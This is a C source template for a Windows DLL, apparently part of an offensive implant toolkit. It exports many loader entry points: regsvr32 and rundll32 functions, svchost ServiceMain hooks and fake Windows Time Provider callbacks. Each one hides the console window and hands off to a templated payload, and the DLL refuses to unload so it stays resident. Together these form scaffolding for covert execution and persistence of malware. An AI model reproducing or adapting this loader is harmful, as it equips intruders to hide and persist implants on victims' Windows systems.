// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define WINVER 0x0600
#define _WIN32_WINNT 0x0600

#define NOWH
#define NOMB
#define NOMSG
#define NONLS
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOMINMAX
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define UNICODE
#define EXPORT __declspec(dllexport)

#include <winsock.h>
#include <windows.h>
#include <timeprov.h>

#include "bolt.h"

EXPORT HRESULT WINAPI VoidFunc(void) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}
EXPORT HRESULT WINAPI DllCanUnloadNow(void) {
    // Always return S_FALSE so we can stay loaded.
    return 1;
}
EXPORT HRESULT WINAPI DllRegisterServer(void) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}
EXPORT HRESULT WINAPI DllUnregisterServer(void) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}
EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
    return 0;
}
EXPORT HRESULT WINAPI RegisterModule(DWORD v, void* m, void* g) {
    return 0;
}
EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
    return 0;
}
EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
    *p = (TimeProvHandle)1;
    return 0;
}

EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
    $export();
}
EXPORT VOID WINAPI SvchostPushServiceGlobals(LPVOID g) {}
EXPORT VOID WINAPI $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
    }
    if (r == DLL_PROCESS_DETACH) {
        GenerateConsoleCtrlEvent(1, 0); // Generate a SIGTERM signal to tell Go to exit cleanly.
    }
    return TRUE;
}
